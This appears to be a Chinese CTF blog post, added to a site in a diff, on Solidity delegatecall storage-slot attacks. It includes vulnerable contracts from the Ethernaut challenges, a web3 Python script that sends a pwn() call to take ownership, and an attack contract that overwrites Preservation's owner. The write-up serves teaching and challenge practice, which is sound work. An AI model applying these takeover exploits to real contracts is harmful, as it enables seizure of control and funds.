@@ -1,0 +1,500 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>Delegatecall(1) - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/2.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Delegatecall(1)">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-09-13 12:46" pubdate>
+        2022年9月13日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      16
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Delegatecall(1)</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Delegatecall-1"><a href="#Delegatecall-1" class="headerlink" title="Delegatecall(1)"></a>Delegatecall(1)</h1><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/blockchain/ethereum/attacks/delegatecall/">wiki原理</a></p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><code>delegate.delegatecall(msg.data)</code>这一行msg.data用户可控所以如果给msg.data传入<code>pwn()</code>的函数签名即可调用到Delegate覆盖owner。所以攻击就很简单了调用Delegation合约一个不存在的函数即可触发回调函数，从而利用delegatecall覆盖owner。</p>
+<figure class="highlight d"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs d"><span class="hljs-keyword">pragma</span> solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.18</span>;<br><br>contract Delegate &#123;<br><br>    address <span class="hljs-keyword">public</span> owner;<br><br>    <span class="hljs-built_in">function</span> Delegate(address _owner) <span class="hljs-keyword">public</span> &#123;<br>        owner = _owner;<br>    &#125;<br><br>    <span class="hljs-built_in">function</span> pwn() <span class="hljs-keyword">public</span> &#123;<br>        owner = msg.sender;<br>    &#125;<br>&#125;<br><br>contract Delegation &#123;<br><br>    address <span class="hljs-keyword">public</span> owner;<br>    Delegate <span class="hljs-built_in">delegate</span>;<br><br>    <span class="hljs-built_in">function</span> Delegation(address _delegateAddress) <span class="hljs-keyword">public</span> &#123;<br>        <span class="hljs-built_in">delegate</span> = Delegate(_delegateAddress);<br>        owner = msg.sender;<br>    &#125;<br><br>    <span class="hljs-built_in">function</span>() <span class="hljs-keyword">public</span> &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">delegate</span>.delegatecall(msg.data)) &#123;<br>            <span class="hljs-keyword">this</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>攻击脚本</p>
+<figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c">import solcx<br>from eth_abi import abi, encode_abi<br>from  eth_utils import  keccak<br>from Crypto.Util.number import bytes_to_long<br>from web3 import Web3,HTTPProvider<br>from hexbytes import *<br><br><br>abi = &#x27;&#x27;&#x27;[<br>	&#123;<br>		&quot;inputs&quot;: [<br>			&#123;<br>				&quot;name&quot;: &quot;_delegateAddress&quot;,<br>				&quot;type&quot;: &quot;address&quot;<br>			&#125;<br>		],<br>		&quot;payable&quot;: false,<br>		&quot;stateMutability&quot;: &quot;nonpayable&quot;,<br>		&quot;type&quot;: &quot;constructor&quot;<br>	&#125;,<br>	&#123;<br>		&quot;payable&quot;: false,<br>		&quot;stateMutability&quot;: &quot;nonpayable&quot;,<br>		&quot;type&quot;: &quot;fallback&quot;<br>	&#125;,<br>	&#123;<br>		&quot;constant&quot;: true,<br>		&quot;inputs&quot;: [],<br>		&quot;name&quot;: &quot;owner&quot;,<br>		&quot;outputs&quot;: [<br>			&#123;<br>				&quot;name&quot;: &quot;&quot;,<br>				&quot;type&quot;: &quot;address&quot;<br>			&#125;<br>		],<br>		&quot;payable&quot;: false,<br>		&quot;stateMutability&quot;: &quot;view&quot;,<br>		&quot;type&quot;: &quot;function&quot;<br>	&#125;<br>]&#x27;&#x27;&#x27;<br><br>bytecode  = &#x27;&#x27;&#x27;<span class="hljs-number">60806040523480</span><span class="hljs-number">15610010576000</span>80fd5b<span class="hljs-number">50604051602080</span><span class="hljs-number">6102</span>1b<span class="hljs-number">83398101806040</span><span class="hljs-number">52810190808051</span><span class="hljs-number">90602001909291</span><span class="hljs-number">90505050806001</span><span class="hljs-number">6000610100</span>0a<span class="hljs-number">81548173</span>ffffffffffffffffffffffffffffffffffffffff<span class="hljs-number">021916908373</span>ffffffffffffffffffffffffffffffffffffffff<span class="hljs-number">16021790555033</span><span class="hljs-number">600080610100</span>0a<span class="hljs-number">81548173</span>ffffffffffffffffffffffffffffffffffffffff<span class="hljs-number">021916908373</span>ffffffffffffffffffffffffffffffffffffffff<span class="hljs-number">16021790555050</span><span class="hljs-number">610157806100</span>c<span class="hljs-number">4600039600</span>0f<span class="hljs-number">30060806040526</span><span class="hljs-number">00436106100415</span><span class="hljs-number">76000357</span>c<span class="hljs-number">01000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00900463</span>ffffffff<span class="hljs-number">168063</span>8da5cb5b<span class="hljs-number">146100</span>af575b<span class="hljs-number">3480156100</span>4d<span class="hljs-number">57600080</span>fd5b<span class="hljs-number">50600160009054</span><span class="hljs-number">90610100</span>0a<span class="hljs-number">900473</span>ffffffffffffffffffffffffffffffffffffffff<span class="hljs-number">1673</span>ffffffffffffffffffffffffffffffffffffffff<span class="hljs-number">16600036604051</span><span class="hljs-number">80838380828437</span><span class="hljs-number">82019150509250</span><span class="hljs-number">50506000604051</span><span class="hljs-number">8083038185</span>5af<span class="hljs-number">491505050005</span>b<span class="hljs-number">3480156100</span>bb<span class="hljs-number">57600080</span>fd5b<span class="hljs-number">506100</span>c<span class="hljs-number">4610106565</span>b<span class="hljs-number">604051808273</span>ffffffffffffffffffffffffffffffffffffffff<span class="hljs-number">1673</span>ffffffffffffffffffffffffffffffffffffffff<span class="hljs-number">16815260200191</span><span class="hljs-number">50506040518091</span><span class="hljs-number">0390</span>f35b<span class="hljs-number">60008090549061</span><span class="hljs-number">0100</span>0a<span class="hljs-number">900473</span>ffffffffffffffffffffffffffffffffffffffff<span class="hljs-number">16815600</span>a<span class="hljs-number">165627</span>a7a<span class="hljs-number">7230582046</span>ec<span class="hljs-number">482585</span>7dbe8a086f8c9ca7c4f<span class="hljs-number">1505</span>7c<span class="hljs-number">719170</span>7ed100c6c5eee654d786ccd<span class="hljs-number">0029</span>&#x27;&#x27;&#x27;<br><br>account_from = &#123;<br>    &#x27;private_key&#x27;: &#x27;xxxxxxxx&#x27;,<br>    &#x27;address&#x27;: &#x27;0x<span class="hljs-number">9064</span>1D6c<span class="hljs-number">069182</span>9Dd70C39EE10EA44B26ac8C5AE&#x27;,<br>&#125;<br><br>def SendTxn(txn,private_key):<br>    signed_txn = web3.eth.account.signTransaction(txn, private_key=private_key)<br>    <span class="hljs-meta"># print(signed_txn)</span><br>    res = web3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()<br>    txn_receipt = web3.eth.waitForTransactionReceipt(res)<br>    <span class="hljs-meta">#</span><br>    print(res)<br>    return txn_receipt<br><br>contract_address     = Web3.toChecksumAddress(<span class="hljs-string">&quot;0x6d4e52Df316825C6d5d0AE6c651500C5284DDBFC&quot;</span>)<br>rpc = <span class="hljs-string">&quot;https://ropsten.infura.io/v3/4f2d58fd34914336830121c8c562a2bf&quot;</span><br>web3 = Web3(HTTPProvider(rpc))<br><br>acc1 = web3.eth.account.from_key(account_from[&#x27;private_key&#x27;])<br>print(f&#x27;Attempting to deploy from account: &#123; account_from[&quot;address&quot;] &#125;&#x27;)<br><br><span class="hljs-meta"># 4. Create contract instance</span><br>Incrementer = web3.eth.contract(abi=abi, bytecode=bytecode)<br><br>params = &#123;<br>    &#x27;nonce&#x27;: web3.eth.getTransactionCount(acc1.address),<br>    &#x27;value&#x27;: web3.toWei(<span class="hljs-number">0</span>,&#x27;ether&#x27;),<br>    &#x27;gas&#x27;: <span class="hljs-number">3000000</span>,<br>    &#x27;gasPrice&#x27;: web3.eth.gasPrice,<br>    &#x27;from&#x27;: acc1.address,<br>    &#x27;to&#x27;:contract_address,<br>    &#x27;data&#x27;: HexBytes(web3.sha3(text=&#x27;pwn()&#x27;)).hex()[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>]<br>&#125;<br><br>tx_receipt = SendTxn(params,account_from[&#x27;private_key&#x27;])<br><br>print(f&#x27;Contract deployed at address: &#123;tx_receipt.contractAddress&#125;&#x27;)<br></code></pre></div></td></tr></table></figure>
+
+<p>查看结果<br><img src="https://img-blog.csdnimg.cn/img_convert/89de13b491d5f6b0044bca0a8461d4fd.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/65ac0d453738d80f420ae7cffb16d33a.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h2><p>源码</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">pragma solidity ^<span class="hljs-number">0</span>.<span class="hljs-number">4</span>.<span class="hljs-number">23</span>;<br><br>contract A &#123;<br>    <span class="hljs-keyword">address </span>public c;<br>    <span class="hljs-keyword">address </span>public <span class="hljs-keyword">b;</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword"> </span>   function test() public returns (<span class="hljs-keyword">address </span>a) &#123;<br>        a = <span class="hljs-keyword">address(this);</span><br><span class="hljs-keyword"> </span>       <span class="hljs-keyword">b </span>= a;<br>    &#125;<br>&#125;<br><br>contract <span class="hljs-keyword">B </span>&#123;<br>    <span class="hljs-keyword">address </span>public <span class="hljs-keyword">b;</span><br><span class="hljs-keyword"> </span>   <span class="hljs-keyword">address </span>public c;<br><br>    function withdelegatecall(<span class="hljs-keyword">address </span>testaddress) public &#123;<br>        testaddress.delegatecall(<span class="hljs-keyword">bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="hljs-keyword"> </span>   &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="本地调试"><a href="#本地调试" class="headerlink" title="本地调试"></a>本地调试</h3><p>利用外部账户调用<code>withdelegatecall</code>，要调用<code>delegatecall</code>时的栈数据<br><img src="https://img-blog.csdnimg.cn/img_convert/9ac5ddf69bb6f0b0b0532374090425ee.png" srcset="/img/loading.gif" lazyload></p>
+<p>opcode说明如下，是会保持当前合约的执行上下文，意思就是如果后面修改了合约中的storage，比如修改了slot[0]，那么最终改变的时B合约的b变量因为它正好时slot[0]位置而不是示A合约的c变量。<br><img src="https://img-blog.csdnimg.cn/img_convert/2cf855a5ed9080f064ecd2f77c964b3b.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到最终在要进行<code>sstore</code>操作时，使用 Storage 变量时依据并不是变量名，而是变量的存储位。<br><img src="https://img-blog.csdnimg.cn/img_convert/2ec606a9037ba378c8157f27da77b7bc.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/91dc323f7d0bd5b1a44af6353c79db6c.png" srcset="/img/loading.gif" lazyload></p>
+<p>wiki总结</p>
+<blockquote>
+<p>sstore 即访存指令，可以看到写入的是 1 号存储位，1 号存储位 在 B 合约中即对应变量 c，在 A 合约中则对应变量 b，所以事实上调用 delegatecall 来使用 Storage 变量时依据并不是变量名，而是变量的存储位，这样的话我们就可以达到覆盖相关变量的目的。</p>
+</blockquote>
+<h3 id="ethernaut-第-16-题"><a href="#ethernaut-第-16-题" class="headerlink" title="ethernaut 第 16 题"></a>ethernaut 第 16 题</h3><p>合约源码</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br>pragma solidity ^<span class="hljs-number">0.6</span>.<span class="hljs-number">0</span>;<br><br>contract Preservation &#123;<br><br>  <span class="hljs-comment">// public library contracts </span><br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  <span class="hljs-comment">// Sets the function signature for delegatecall</span><br>  bytes4 constant setTimeSignature = bytes4(keccak256(<span class="hljs-string">&quot;setTime(uint256)&quot;</span>));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br> <br>  <span class="hljs-comment">// set the time for timezone 1</span><br>  <span class="hljs-keyword">function</span> set<span class="hljs-constructor">FirstTime(<span class="hljs-params">uint</span> <span class="hljs-params">_timeStamp</span>)</span> public &#123;<br>    timeZone1Library.delegatecall(abi.encode<span class="hljs-constructor">Packed(<span class="hljs-params">setTimeSignature</span>, <span class="hljs-params">_timeStamp</span>)</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// set the time for timezone 2</span><br>  <span class="hljs-keyword">function</span> set<span class="hljs-constructor">SecondTime(<span class="hljs-params">uint</span> <span class="hljs-params">_timeStamp</span>)</span> public &#123;<br>    timeZone2Library.delegatecall(abi.encode<span class="hljs-constructor">Packed(<span class="hljs-params">setTimeSignature</span>, <span class="hljs-params">_timeStamp</span>)</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// Simple library contract to set the time</span><br>contract LibraryContract &#123;<br><br>  <span class="hljs-comment">// stores a timestamp </span><br>  uint storedTime;  <br><br>  <span class="hljs-keyword">function</span> set<span class="hljs-constructor">Time(<span class="hljs-params">uint</span> <span class="hljs-params">_time</span>)</span> public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>先调用一次<code>setFirstTime</code>覆盖timeZone1Library为我们的攻击合约地址第二次调用<code>setFirstTime</code>就可以执行攻击合约的任意函数了。</p>
+<p>攻击合约没啥特别的，和wiki一样。</p>
+<figure class="highlight d"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs d"><span class="hljs-keyword">pragma</span> solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./source.sol&quot;</span>;<br>contract attack &#123;<br>    address <span class="hljs-keyword">public</span> timeZone1Library;<br>    address <span class="hljs-keyword">public</span> timeZone2Library;<br>    address <span class="hljs-keyword">public</span> owner;<br><br>    address instance_address = <span class="hljs-number">0</span>xAc40c9C8dADE7B9CF37aEBb49Ab49485eBD3510d;<br>    Preservation target = Preservation(instance_address);<br>    <span class="hljs-built_in">function</span> attack1() <span class="hljs-keyword">public</span>&#123;<br>        target.setFirstTime(<span class="hljs-built_in">uint</span>(address(<span class="hljs-keyword">this</span>)));<br>    &#125;<br>    <span class="hljs-built_in">function</span> attack2() <span class="hljs-keyword">public</span>&#123;<br>        target.setFirstTime(<span class="hljs-built_in">uint</span>(<span class="hljs-number">0</span>x5B38Da6a701c568545dCfcB03FcB875f56beddC4));<br>    &#125;<br>    <span class="hljs-built_in">function</span> setTime(<span class="hljs-built_in">uint</span> _time) <span class="hljs-keyword">public</span> &#123;<br>        timeZone1Library = address(_time);<br>        timeZone2Library = address(_time);<br>        owner = address(_time);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<p>最后三个变量值都覆盖为一样的了<br><img src="https://img-blog.csdnimg.cn/img_convert/2e9cf809e440241e90b72bfbec5fa000.png" srcset="/img/loading.gif" lazyload></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/blockchain/">blockchain</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/09/16/2022-9-16-Delegatecall(2)/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Delegatecall(2)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/09/11/2022-9-11-%E8%96%85%E7%BE%8A%E6%AF%9B/">
+                        <span class="hidden-mobile">薅羊毛</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP备2022002829号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
